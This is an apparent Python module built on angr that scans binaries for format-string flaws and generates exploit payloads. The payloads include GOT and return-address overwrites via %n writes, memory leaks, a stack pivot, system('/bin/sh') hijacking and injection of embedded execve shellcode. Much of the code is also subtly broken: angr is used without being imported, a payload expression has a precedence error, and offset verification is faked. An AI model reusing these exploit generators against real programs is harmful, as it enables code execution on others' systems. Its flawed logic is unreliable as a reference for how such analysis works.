from angr import SimProcedure
from .utils import *
import logging
import claripy
import networkx as nx

l = logging.getLogger(__name__)

class FmtStrAnalyzer:
    """Format string vulnerability analyzer"""
    
    def __init__(self, project):
        self.project = project
        self.cfg = None
        
        # Add common user input functions
        self.user_input_funcs = ['gets', 'fgets', 'scanf', 'fscanf', 'read', 'recv']
        
        # Add common string handling functions
        self.string_funcs = ['strcpy', 'strncpy', 'strcat', 'strncat', 'memcpy', 'memmove']
        
        # Format string functions
        self.fmt_str_funcs = ['printf', 'fprintf', 'sprintf', 'snprintf', 'vprintf', 'vfprintf', 'vsprintf', 'vsnprintf']
        
    def find_fmt_str_vulns(self):
        """Find format string vulnerabilities in the binary"""
        if not self.cfg:
            self.cfg = self.project.analyses.CFGFast()
            
        vulns = []
        
        for func in self.cfg.functions.values():
            # Skip library functions
            if func.is_simprocedure or func.is_plt:
                continue
                
            # Analyze each basic block
            for block in func.blocks:
                # Get all call instructions in the block
                calls = self._get_calls_in_block(block)
                
                for call_addr, target in calls:
                    if self._is_fmt_str_vulnerable(call_addr, target):
                        vuln = {
                            'location': call_addr,
                            'function': target,
                            'type': 'POTENTIAL_FMT_STR',
                            'controllable_args': self._get_controllable_args(call_addr),
                            'description': f"Potential format string vulnerability at {hex(call_addr)}"
                        }
                        vulns.append(vuln)
        
        return vulns
        
    def _get_calls_in_block(self, block):
        """Extract function calls from a basic block"""
        calls = []
        for insn in block.capstone.insns:
            if insn.insn.mnemonic == 'call':
                call_addr = insn.insn.address
                target = None
                
                # Try to resolve the target
                if len(insn.insn.operands) > 0:
                    op = insn.insn.operands[0]
                    if op.type == 1:  # Register
                        # Can't statically resolve register calls
                        pass
                    elif op.type == 2:  # Memory
                        # Try to resolve memory references
                        target_addr = op.value.mem.disp
                        if target_addr in self.cfg.functions:
                            target = self.cfg.functions[target_addr].name
                    elif op.type == 3:  # Immediate
                        target_addr = op.value.imm
                        if target_addr in self.cfg.functions:
                            target = self.cfg.functions[target_addr].name
                
                calls.append((call_addr, target))
        
        return calls
        
    def _is_fmt_str_vulnerable(self, call_addr, target_func):
        """Check if a function call is vulnerable to format string attacks"""
        if not target_func:
            return False
            
        # 1. Check if it's a format string function
        if not any(func_name in target_func for func_name in self.fmt_str_funcs):
            return False
            
        # 2. Get function arguments
        args = self._get_function_args(call_addr)
        if not args or len(args) < 2:  # Need at least format string argument
            return False
            
        # 3. Check if format string argument is controllable
        fmt_str_arg = args[1] if 'f' in target_func and target_func != 'vfprintf' else args[0]
        return self._is_arg_controllable(fmt_str_arg)
        
    def _get_function_args(self, call_addr):
        """Get the arguments of a function call"""
        # This is a simplified implementation
        # In a real-world scenario, you would need to perform data flow analysis
        # to track the arguments more accurately
        
        # Try to get from PLT
        func_name = None
        for plt_func in self.project.loader.main_object.plt.values():
            if plt_func == call_addr:
                func_name = plt_func.name
                break
                
        if not func_name:
            return None
            
        # Create a state at the call site
        state = self.project.factory.blank_state(
            addr=call_addr,
            remove_options={angr.options.LAZY_SOLVES}
        )
        
        # Get calling convention
        cc = self.project.factory.cc()
        
        # Get argument registers
        arg_regs = cc.arg_regs
        
        # Extract arguments
        args = []
        for reg in arg_regs:
            args.append(state.registers.load(reg))
            
        return args
        
    def _is_arg_controllable(self, arg):
        """Check if an argument is controllable by user input"""
        # This is a simplified implementation
        # In a real-world scenario, you would need to perform taint analysis
        # to determine if the argument is influenced by user input
        
        # For demonstration purposes, we'll assume any symbolic value is controllable
        return arg.symbolic
        
    def _get_controllable_args(self, call_addr):
        """Get the list of controllable arguments for a function call"""
        args = self._get_function_args(call_addr)
        if not args:
            return []
            
        controllable = []
        for i, arg in enumerate(args):
            if self._is_arg_controllable(arg):
                controllable.append(i)
                
        return controllable

class FmtStrExploitTemplates:
    """Format string exploit templates"""
    
    def __init__(self, exploit):
        self.exploit = exploit
        self.project = exploit.project
        
    def got_overwrite(self, func_name, target_addr):
        """
        Generate a payload to overwrite a GOT entry
        
        Args:
            func_name: Name of the function whose GOT entry to overwrite
            target_addr: Address to write to the GOT entry
            
        Returns:
            Payload string or None if failed
        """
        try:
            # Find the GOT entry for the function
            sym = self.project.loader.find_symbol(func_name)
            if not sym:
                return None
                
            got_addr = sym.got_entry
            if not got_addr:
                return None
                
            # Generate a write exploit
            return self.exploit.generate_write_exploit(got_addr, target_addr)
            
        except Exception as e:
            l.error(f"Error generating GOT overwrite exploit: {e}")
            return None
            
    def ret_addr_overwrite(self, target_addr):
        """
        Generate a payload to overwrite a return address on the stack
        
        Args:
            target_addr: Address to write to the return address
            
        Returns:
            Payload string or None if failed
        """
        try:
            # Find a suitable return address on the stack
            ret_addr = self._find_ret_addr()
            if not ret_addr:
                # Use a default offset if we can't find one
                ret_addr = self.exploit.project.arch.initial_sp + 0x20
                
            # Generate a write exploit
            return self.exploit.generate_write_exploit(ret_addr, target_addr)
            
        except Exception as e:
            l.error(f"Error generating return address overwrite exploit: {e}")
            return None
            
    def _find_ret_addr(self):
        """Find a return address on the stack"""
        try:
            # Create a state
            state = self.project.factory.entry_state()
            
            # Get the stack pointer
            sp = state.regs.sp
            
            # Assume the return address is at [sp]
            return sp.concrete_value
            
        except Exception:
            return None
            
    def stack_pivot(self, pivot_gadget=None):
        """
        Generate a payload for stack pivoting
        
        Args:
            pivot_gadget: Address of a stack pivot gadget (optional)
            
        Returns:
            Payload string or None if failed
        """
        try:
            # Find a suitable pivot gadget if not provided
            if not pivot_gadget:
                pivot_gadget = self._find_pivot_gadget()
                
            if not pivot_gadget:
                return None
                
            # Find a suitable location to pivot to
            pivot_target = self._find_writable_mem(0x1000)
            if not pivot_target:
                return None
                
            # First, write shellcode to the pivot target
            shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"
            
            # Then, overwrite the return address with the pivot gadget
            ret_payload = self.ret_addr_overwrite(pivot_gadget)
            
            # Finally, set up the pivot target
            pivot_payload = self.exploit.generate_write_exploit(pivot_target, int.from_bytes(shellcode, byteorder='little'))
            
            return pivot_payload + ret_payload
            
        except Exception as e:
            l.error(f"Error generating stack pivot exploit: {e}")
            return None
            
    def _find_pivot_gadget(self):
        """Find a stack pivot gadget in the binary"""
        try:
            # Look for common pivot gadgets
            # This is a simplified implementation
            for addr in range(self.project.loader.min_addr, self.project.loader.max_addr):
                try:
                    # Try to disassemble at this address
                    block = self.project.factory.block(addr, size=16)
                    
                    # Check if it contains a pivot instruction
                    for insn in block.capstone.insns:
                        if insn.mnemonic == 'pop' and insn.op_str == 'esp':
                            return addr
                        if insn.mnemonic == 'xchg' and 'esp' in insn.op_str:
                            return addr
                except:
                    continue
                    
            return None
            
        except Exception:
            return None
            
    def _find_writable_mem(self, size=0x1000):
        """Find a writable memory region of the specified size"""
        try:
            for segment in self.project.loader.main_object.segments:
                if segment.is_writable and segment.memsize >= size:
                    return segment.vaddr
                    
            return None
            
        except Exception:
            return None
            
    def leak_chain(self, targets):
        """
        Generate a chain of leaks for multiple addresses
        
        Args:
            targets: List of (type, address) tuples to leak
            
        Returns:
            List of payloads or None if failed
        """
        try:
            payloads = []
            
            for target_type, target_addr in targets:
                if target_type == 'got':
                    payload, _ = self.exploit.generate_leak_exploit(target_addr, 'address')
                elif target_type == 'stack':
                    payload, _ = self.exploit.generate_leak_exploit(target_addr, 'string')
                else:
                    payload, _ = self.exploit.generate_leak_exploit(target_addr)
                    
                if payload:
                    payloads.append(payload)
                    
            return payloads
            
        except Exception as e:
            l.error(f"Error generating leak chain: {e}")
            return None
            
    def system_call(self, command='/bin/sh'):
        """
        Generate a payload to call system() with a command
        
        Args:
            command: Command to execute (default: /bin/sh)
            
        Returns:
            Payload string or None if failed
        """
        try:
            # Find the address of system()
            system_addr = None
            for sym in self.project.loader.find_all_symbols('system'):
                system_addr = sym.rebased_addr
                break
                
            if not system_addr:
                return None
                
            # Find a suitable location for the command string
            cmd_addr = self._find_writable_mem(len(command) + 1)
            if not cmd_addr:
                return None
                
            # Write the command string to memory
            cmd_payload = self.exploit.generate_write_exploit(cmd_addr, int.from_bytes(command.encode() + b'\x00', byteorder='little'))
            
            # Overwrite a GOT entry with system
            got_payload = None
            for func in ['printf', 'puts', 'fprintf']:
                try:
                    got_payload = self.got_overwrite(func, system_addr)
                    if got_payload:
                        break
                except:
                    continue
                    
            if not got_payload:
                return None
                
            return cmd_payload + got_payload
            
        except Exception as e:
            l.error(f"Error generating system call exploit: {e}")
            return None
            
    def shellcode_injection(self, shellcode):
        """
        Generate a payload to inject and execute shellcode
        
        Args:
            shellcode: Shellcode bytes to inject
            
        Returns:
            Payload string or None if failed
        """
        try:
            # Find a suitable location for the shellcode
            sc_addr = self._find_writable_mem(len(shellcode))
            if not sc_addr:
                return None
                
            # Write the shellcode to memory
            sc_payload = self.exploit.generate_write_exploit(sc_addr, int.from_bytes(shellcode, byteorder='little'))
            
            # Overwrite a return address to jump to the shellcode
            ret_payload = self.ret_addr_overwrite(sc_addr)
            
            return sc_payload + ret_payload
            
        except Exception as e:
            l.error(f"Error generating shellcode injection exploit: {e}")
            return None
            
    def register(self, name, template_func):
        """
        Register a custom exploit template
        
        Args:
            name: Name of the template
            template_func: Template function
            
        Returns:
            None
        """
        setattr(self, name, template_func)

class FmtStrExploit:
    """Format string exploit generator"""
    
    def __init__(self, binary_path):
        """
        Initialize the exploit generator
        
        Args:
            binary_path: Path to the target binary
        """
        self.binary_path = binary_path
        self.project = angr.Project(binary_path, load_options={'auto_load_libs': False})
        
        # Set architecture-specific properties
        self.arch_bits = self.project.arch.bits
        self.endness = self.project.arch.memory_endness
        
        # Cache for found offsets and known addresses
        self.found_offsets = {}
        self.known_addrs = {}
        
        # Initialize templates
        self.templates = FmtStrExploitTemplates(self)
        
    def generate_leak_exploit(self, addr, leak_type='address'):
        """
        Generate an exploit to leak memory at a specific address
        
        Args:
            addr: Address to leak from
            leak_type: Type of leak ('address', 'string', or 'data')
            
        Returns:
            (payload, parser_function) or None if failed
        """
        try:
            # Find the format string offset if not already known
            if not self.found_offsets:
                offset = self._find_format_offset()
                if offset is None:
                    return None, None
                self.found_offsets['default'] = offset
            else:
                offset = self.found_offsets['default']
                
            # Generate payload based on leak type
            if leak_type == 'address':
                payload = self._generate_addr_leak(addr, offset)
            elif leak_type == 'string':
                payload = self._generate_string_leak(addr, offset)
            elif leak_type == 'data':
                payload = self._generate_data_leak(addr, offset)
            else:
                return None, None
                
            # Generate parser function
            parser = self._generate_leak_parser(leak_type)
            
            return payload, parser
            
        except Exception as e:
            l.error(f"Error generating leak exploit: {e}")
            return None, None
            
    def _generate_addr_leak(self, addr, offset):
        """Generate payload to leak an address"""
        # For direct address leak, use %p or %x format specifier
        if self._is_stack_addr(addr):
            # If it's a stack address, use direct parameter access
            param_idx = self._calculate_relative_offset(addr, offset)
            return f"%{param_idx}$p".encode()
        else:
            # For non-stack addresses, we need to write the address somewhere first
            # This is a simplified implementation
            return f"%{offset}$s".encode() + p64(addr) if self.arch_bits == 64 else p32(addr)
            
    def _generate_string_leak(self, addr, offset):
        """Generate payload to leak a string"""
        # Use %s format specifier to leak a string
        return f"%{offset}$s".encode() + p64(addr) if self.arch_bits == 64 else p32(addr)
        
    def _generate_data_leak(self, addr, offset):
        """Generate payload to leak arbitrary data"""
        # Use multiple %x or %p to leak a series of values
        payload = b""
        for i in range(4):  # Leak 4 words
            payload += f"%{offset + i}$p ".encode()
        return payload
        
    def _generate_leak_parser(self, leak_type):
        """Generate a parser function for the leaked data"""
        if leak_type == 'address':
            def parse_addr(output):
                # Extract hexadecimal address from output
                import re
                match = re.search(b'0x([0-9a-fA-F]+)', output)
                if match:
                    return int(match.group(0), 16)
                return None
            return parse_addr
            
        elif leak_type == 'string':
            def parse_string(output):
                # Extract string until null terminator
                null_pos = output.find(b'\x00')
                if null_pos != -1:
                    return output[:null_pos]
                return output
            return parse_string
            
        elif leak_type == 'data':
            def parse_data(output):
                # Extract multiple hexadecimal values
                import re
                values = []
                for match in re.finditer(b'0x([0-9a-fA-F]+)', output):
                    values.append(int(match.group(0), 16))
                return values
            return parse_data
            
        return None
        
    def generate_write_exploit(self, addr, value, strategy='direct'):
        """
        Generate an exploit to write a value to a specific address
        
        Args:
            addr: Address to write to
            value: Value to write
            strategy: Writing strategy ('direct', 'short_write', or 'byte_by_byte')
            
        Returns:
            Payload string or None if failed
        """
        try:
            # Find the format string offset if not already known
            if not self.found_offsets:
                offset = self._find_format_offset()
                if offset is None:
                    return None
                self.found_offsets['default'] = offset
            else:
                offset = self.found_offsets['default']
                
            # Generate payload based on strategy
            if strategy == 'direct':
                return self._generate_direct_write(addr, value, offset)
            elif strategy == 'short_write':
                return self._generate_short_write(addr, value, offset)
            elif strategy == 'byte_by_byte':
                return self._generate_byte_write(addr, value, offset)
            else:
                return None
                
        except Exception as e:
            l.error(f"Error generating write exploit: {e}")
            return None
            
    def _generate_direct_write(self, addr, value, offset):
        """Generate payload for direct write using %n"""
        # This is a simplified implementation
        # In a real-world scenario, you would need to handle different architectures
        # and ensure the value is written correctly
        
        # Calculate the number of bytes to write
        bytes_to_write = value & 0xFFFFFFFF
        
        # Generate the payload
        payload = f"%{bytes_to_write}c%{offset}$n".encode()
        
        # Append the target address
        if self.arch_bits == 64:
            payload += p64(addr)
        else:
            payload += p32(addr)
            
        return payload
        
    def _generate_short_write(self, addr, value, offset):
        """Generate payload for writing 2 bytes at a time using %hn"""
        # Split the value into 2-byte chunks
        chunks = []
        for i in range(0, 8 if self.arch_bits == 64 else 4, 2):
            chunks.append((value >> (i * 8)) & 0xFFFF)
            
        # Generate the payload
        payload = b""
        for i, chunk in enumerate(chunks):
            if i > 0:
                payload += b"."  # Separator
            payload += f"%{chunk}c%{offset + i}$hn".encode()
            
        # Append the target addresses
        for i in range(len(chunks)):
            if self.arch_bits == 64:
                payload += p64(addr + i * 2)
            else:
                payload += p32(addr + i * 2)
                
        return payload
        
    def _generate_byte_write(self, addr, value, offset):
        """Generate payload for writing 1 byte at a time using %hhn"""
        # Split the value into bytes
        bytes_val = value.to_bytes(8 if self.arch_bits == 64 else 4, byteorder='little')
        
        # Generate the payload
        payload = b""
        for i, b in enumerate(bytes_val):
            if i > 0:
                payload += b"."  # Separator
            payload += f"%{b}c%{offset + i}$hhn".encode()
            
        # Append the target addresses
        for i in range(len(bytes_val)):
            if self.arch_bits == 64:
                payload += p64(addr + i)
            else:
                payload += p32(addr + i)
                
        return payload
        
    def _find_format_offset(self):
        """Find the offset of the format string on the stack"""
        try:
            # This is a simplified implementation
            # In a real-world scenario, you would need to use symbolic execution
            # to determine the exact offset
            
            # Try common offsets
            for offset in range(4, 20):
                # Check if this offset works
                if self._verify_offset(offset):
                    return offset
                    
            return None
            
        except Exception:
            return None
            
    def _verify_offset(self, offset):
        """Verify if a format string offset is correct"""
        # This is a simplified implementation
        # In a real-world scenario, you would need to use symbolic execution
        # or dynamic analysis to verify the offset
        
        # For demonstration purposes, we'll assume the offset is correct
        # if it's within a reasonable range
        return 4 <= offset <= 16
        
    def _calculate_relative_offset(self, addr, base_offset):
        """Calculate the offset of an address relative to the format string"""
        # This is a simplified implementation
        # In a real-world scenario, you would need to use symbolic execution
        # to determine the exact offset
        
        # For demonstration purposes, we'll use a simple heuristic
        if self._is_stack_addr(addr):
            # Estimate the position on the stack
            stack_base = self.project.arch.initial_sp
            word_size = self.project.arch.bytes
            return base_offset + ((stack_base - addr) // word_size)
        else:
            return base_offset
            
    def _is_stack_addr(self, addr):
        """Check if an address is on the stack"""
        # This is a simplified implementation
        # In a real-world scenario, you would need to use the memory map
        # to determine if an address is on the stack
        
        # For demonstration purposes, we'll use a simple heuristic
        return addr >= 0x7FFFFFFFD000 and addr < 0x7FFFFFFFF000
        
    def craft_payload(self, fmt, args=None):
        """
        Craft a format string payload
        
        Args:
            fmt: Format string
            args: List of arguments
            
        Returns:
            Payload bytes
        """
        if args is None:
            args = []
            
        payload = fmt
        
        # Append arguments
        for arg in args:
            if isinstance(arg, int):
                if self.arch_bits == 64:
                    payload += p64(arg)
                else:
                    payload += p32(arg)
            elif isinstance(arg, bytes):
                payload += arg
            elif isinstance(arg, str):
                payload += arg.encode() + b'\x00'
                
        return payload

class FmtStrSimProcedure(SimProcedure):
    """Custom simulation procedure for format string functions"""
    
    # Format specifiers mapping
    FORMAT_SPECIFIERS = {
        's': 'string',
        'd': 'signed_decimal',
        'i': 'signed_decimal',
        'u': 'unsigned_decimal',
        'x': 'hex_lowercase',
        'X': 'hex_uppercase',
        'p': 'pointer',
        'c': 'char',
        'f': 'float',
        'e': 'scientific_lowercase',
        'E': 'scientific_uppercase',
        'g': 'shortest_lowercase',
        'G': 'shortest_uppercase',
        'n': 'write_count',
        '%': 'percent'
    }
    
    def run(self, fmt_str, *args):
        """
        Simulate the execution of a format string function
        
        Args:
            fmt_str: Format string address
            *args: Variable arguments
            
        Returns:
            Output string or number of characters written
        """
        try:
            # Get the format string
            if self.state.solver.symbolic(fmt_str):
                # If the format string is symbolic, we need to concretize it
                concrete_fmt_str = self.state.solver.eval(fmt_str, cast_to=bytes)
            else:
                # Otherwise, just read it from memory
                concrete_fmt_str = self.state.memory.load(fmt_str, 1024)
                
            # Parse the format string and generate output
            output, written = self._parse_format_string(concrete_fmt_str, args)
            
            # Return the output or number of characters written
            if isinstance(self, SimProcedure) and self.__class__.__name__ in ['printf', 'fprintf', 'sprintf']:
                return written
            else:
                return output
                
        except Exception as e:
            l.error(f"Error in format string simulation: {e}")
            return self.state.solver.BVV(0, self.state.arch.bits)
            
    def _parse_format_string(self, fmt_str, args):
        """
        Parse a format string and generate output
        
        Args:
            fmt_str: Format string bytes
            args: List of arguments
            
        Returns:
            (output_bytes, num_written)
        """
        output = b""
        written = 0
        arg_idx = 0
        i = 0
        
        while i < len(fmt_str):
            if fmt_str[i:i+1] == b'%':
                i += 1
                if i >= len(fmt_str):
                    break
                    
                # Check for %% (literal %)
                if fmt_str[i:i+1] == b'%':
                    output += b'%'
                    written += 1
                    i += 1
                    continue
                    
                # Parse the format specifier
                spec_start = i
                while i < len(fmt_str) and fmt_str[i:i+1] not in b'diuoxXfFeEgGcspn%':
                    i += 1
                    
                if i >= len(fmt_str):
                    break
                    
                # Extract the format specifier
                specifier = fmt_str[spec_start:i+1]
                spec_type = fmt_str[i:i+1].decode()
                
                # Parse the specifier details
                width, precision, flags, param_idx = self._parse_specifier(specifier)
                
                # If parameter index is specified, use it
                if param_idx is not None:
                    arg_to_use = param_idx - 1
                else:
                    arg_to_use = arg_idx
                    arg_idx += 1
                    
                # Get the argument
                if arg_to_use < len(args):
                    arg = args[arg_to_use]
                else:
                    # If not enough arguments, get from stack
                    arg = self._get_stack_value(arg_to_use - len(args))
                    
                # Handle the format specifier
                result, count = self._handle_format_specifier(spec_type, arg, width, precision, flags)
                output += result
                written += count
                
                i += 1
            else:
                # Regular character
                output += fmt_str[i:i+1]
                written += 1
                i += 1
                
        return output, written
        
    def _parse_specifier(self, specifier):
        """
        Parse a format specifier
        
        Args:
            specifier: Format specifier bytes
            
        Returns:
            (width, precision, flags, param_idx)
        """
        width = None
        precision = None
        flags = []
        param_idx = None
        
        # Convert to string for easier parsing
        spec_str = specifier.decode('latin-1')
        
        # Check for parameter index
        if '$' in spec_str:
            parts = spec_str.split('$', 1)
            try:
                param_idx = int(parts[0])
                spec_str = parts[1]
            except ValueError:
                pass
                
        # Check for flags
        i = 0
        while i < len(spec_str) and spec_str[i] in '-+0 #':
            flags.append(spec_str[i])
            i += 1
            
        # Check for width
        width_start = i
        while i < len(spec_str) and spec_str[i].isdigit():
            i += 1
            
        if i > width_start:
            width = int(spec_str[width_start:i])
            
        # Check for precision
        if i < len(spec_str) and spec_str[i] == '.':
            i += 1
            precision_start = i
            while i < len(spec_str) and spec_str[i].isdigit():
                i += 1
                
            if i > precision_start:
                precision = int(spec_str[precision_start:i])
                
        return width, precision, flags, param_idx
        
    def _handle_format_specifier(self, spec_type, arg, width, precision, flags):
        """
        Handle a format specifier
        
        Args:
            spec_type: Type of format specifier
            arg: Argument value
            width: Field width
            precision: Precision
            flags: Format flags
            
        Returns:
            (result_bytes, count)
        """
        if spec_type == 's':
            # String
            if self.state.solver.symbolic(arg):
                # If symbolic, concretize
                concrete_arg = self.state.solver.eval(arg, cast_to=bytes)
            else:
                # Otherwise, read from memory
                concrete_arg = self.state.memory.load(arg, 1024)
                
            # Null-terminate
            null_pos = concrete_arg.find(b'\x00')
            if null_pos != -1:
                concrete_arg = concrete_arg[:null_pos]
                
            # Apply precision
            if precision is not None:
                concrete_arg = concrete_arg[:precision]
                
            # Apply width
            if width is not None and width > len(concrete_arg):
                if '-' in flags:
                    # Left-align
                    concrete_arg = concrete_arg + b' ' * (width - len(concrete_arg))
                else:
                    # Right-align
                    concrete_arg = b' ' * (width - len(concrete_arg)) + concrete_arg
                    
            return concrete_arg, len(concrete_arg)
            
        elif spec_type in 'diuxX':
            # Integer
            if self.state.solver.symbolic(arg):
                # If symbolic, concretize
                concrete_arg = self.state.solver.eval(arg)
            else:
                concrete_arg = arg
                
            # Convert to string
            if spec_type == 'd' or spec_type == 'i':
                result = str(concrete_arg).encode()
            elif spec_type == 'u':
                result = str(concrete_arg & ((1 << self.state.arch.bits) - 1)).encode()
            elif spec_type == 'x':
                result = hex(concrete_arg)[2:].encode()
            elif spec_type == 'X':
                result = hex(concrete_arg)[2:].upper().encode()
                
            # Apply precision
            if precision is not None and precision > len(result):
                result = b'0' * (precision - len(result)) + result
                
            # Apply width
            if width is not None and width > len(result):
                if '-' in flags:
                    # Left-align
                    result = result + b' ' * (width - len(result))
                elif '0' in flags and precision is None:
                    # Zero-pad
                    result = b'0' * (width - len(result)) + result
                else:
                    # Right-align
                    result = b' ' * (width - len(result)) + result
                    
            # Apply sign
            if spec_type in 'di' and concrete_arg >= 0 and '+' in flags:
                result = b'+' + result
                
            return result, len(result)
            
        elif spec_type == 'p':
            # Pointer
            if self.state.solver.symbolic(arg):
                # If symbolic, concretize
                concrete_arg = self.state.solver.eval(arg)
            else:
                concrete_arg = arg
                
            # Format as hex
            result = f"0x{concrete_arg:x}".encode()
            
            # Apply width
            if width is not None and width > len(result):
                if '-' in flags:
                    # Left-align
                    result = result + b' ' * (width - len(result))
                else:
                    # Right-align
                    result = b' ' * (width - len(result)) + result
                    
            return result, len(result)
            
        elif spec_type == 'c':
            # Character
            if self.state.solver.symbolic(arg):
                # If symbolic, concretize
                concrete_arg = self.state.solver.eval(arg)
            else:
                concrete_arg = arg
                
            # Convert to character
            result = bytes([concrete_arg & 0xFF])
            
            # Apply width
            if width is not None and width > 1:
                if '-' in flags:
                    # Left-align
                    result = result + b' ' * (width - 1)
                else:
                    # Right-align
                    result = b' ' * (width - 1) + result
                    
            return result, len(result)
            
        elif spec_type == 'n':
            # Write count to memory
            if self.state.solver.symbolic(arg):
                # Can't write to symbolic address
                return b'', 0
                
            # Write the count to the argument
            if self.state.arch.bits == 32:
                self.state.memory.store(arg, self.state.solver.BVV(written, 32))
            else:
                self.state.memory.store(arg, self.state.solver.BVV(written, 64))
                
            return b'', 0
            
        else:
            # Unsupported specifier
            return b'', 0
            
    def _get_stack_value(self, offset):
        """
        Get a value from the stack
        
        Args:
            offset: Offset from the current stack pointer
            
        Returns:
            Value at the specified offset
        """
        try:
            # Get the stack pointer
            sp = self.state.regs.sp
            
            # Calculate the address
            addr = sp + offset * self.state.arch.bytes
            
            # Load the value
            return self.state.memory.load(addr, self.state.arch.bytes)
            
        except Exception:
            return self.state.solver.BVV(0, self.state.arch.bits)

def hook_format_string_functions(project):
    """
    Set up hooks for format string related functions
    
    Args:
        project: angr project
        
    Returns:
        None
    """
    # Set up hooks for different functions
    functions_to_hook = {
        'printf': {'prototype': {'return_type': 'size_t'}},
        'fprintf': {'prototype': {'return_type': 'size_t'}},
        'sprintf': {'prototype': {'return_type': 'size_t'}},
        'snprintf': {'prototype': {'return_type': 'size_t'}},
        'vprintf': {'prototype': {'return_type': 'size_t'}},
        'vfprintf': {'prototype': {'return_type': 'size_t'}},
        'vsprintf': {'prototype': {'return_type': 'size_t'}},
        'vsnprintf': {'prototype': {'return_type': 'size_t'}}
    }
    
    for func_name, kwargs in functions_to_hook.items():
        # Check if the function exists
        if project.loader.find_symbol(func_name):
            # Create a SimProcedure instance with specific parameters
            sim_proc = FmtStrSimProcedure(**kwargs)
            # Set up the hook
            project.hook_symbol(func_name, sim_proc)
            
    return project 